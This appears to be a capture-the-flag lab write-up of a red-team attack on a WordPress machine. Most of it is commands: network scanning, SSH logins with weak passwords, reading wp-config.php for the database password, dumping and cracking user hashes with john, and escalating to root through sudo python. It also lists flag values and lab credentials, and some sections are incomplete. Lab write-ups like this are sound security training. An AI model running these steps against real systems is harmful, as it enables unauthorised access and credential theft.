Nmap scan results for each machine reveal the below services and OS details:
$ nmap -sn 192.168.1.0/24 to find Target 1 IP machine
          
      nmap -sV 192.168.1.110 to check open ports and services
  # 

This scan identifies the services below as potential points of entry:

Exploitation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
Target 1
flag1.txt: {b9bbcb33e11b80be759c4e844862482d}
The exploit used to find flag one was file traversal.
ssh michael@192.168.1.110
password michael
cd /
cd var/www/html
ls
nano service.html 
Within service.html: Ctrl-w flag
Or cat service.html | grep flag

flag2.txt: {fc3fd58dcdad9ab23faca6e9a36e581c}
File traversal was used again to find flag2.
ssh michael@192.168.1.110
password michael
cd /
cd var/www
ls
cat flag2.txt

Find the MySQL database password.
cat /var/www/html/wordpress/wp-config.php


Use the credentials to log into MySQL and dump WordPress user password hashes.
mysql -u root -p
R@v3nSecurity
show databases;
use wordpress;
show tables;
SELECT * FROM wp_users;

SELECT * FROM wp_user INTO OUTFILE ‘/home/michael/wp_hashes.txt’;
Dumps table to a .txt file./home

Nano the file and change it to a format john reads.	
Change user1 and 2 to Michael and steven.

SELECT * FROM wp_posts
Reading the other tables to get flags 3 and 4

Crack password hashes with john.
john --wordlist=/usr/share/wordlists/rockyou.txt wp-hashes.txt 
john --show hashed_passwords.txt

Secure a user shell as the user whose password you cracked.
ssh steven@192.168.1.110
pink84

Escalate to root. One flag can be discovered after this step.
sudo -l
sudo python -c 'import pty;pty.spawn("/bin/bash")'

locate flag

cat /root/flag4.txt
